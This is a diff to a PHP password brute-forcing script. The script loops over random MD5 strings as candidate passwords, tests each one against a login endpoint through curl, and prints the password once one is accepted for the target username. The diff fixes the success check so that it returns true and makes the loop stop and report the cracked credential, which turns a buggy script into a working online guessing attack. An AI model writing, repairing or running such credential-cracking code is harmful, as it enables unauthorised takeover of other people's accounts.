@@ -9,7 +9,7 @@ while(True) {
         $Pass = md5(rand());
 
         if(check_correct($username, $Pass)) {
-            echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
+            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
             <div align='center'><b>Found the password of: ".$Pass."<br> For the account: ".$username."</b></div>
@@ -17,7 +17,7 @@ while(True) {
     </tr>
 </table>
 </body>
-</html>";
+</html>");
             
         }
 
@@ -46,7 +46,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str != "incorrect") {return false;}
+        if($str != "incorrect") {return true;}
         else {return false;}
 }
 
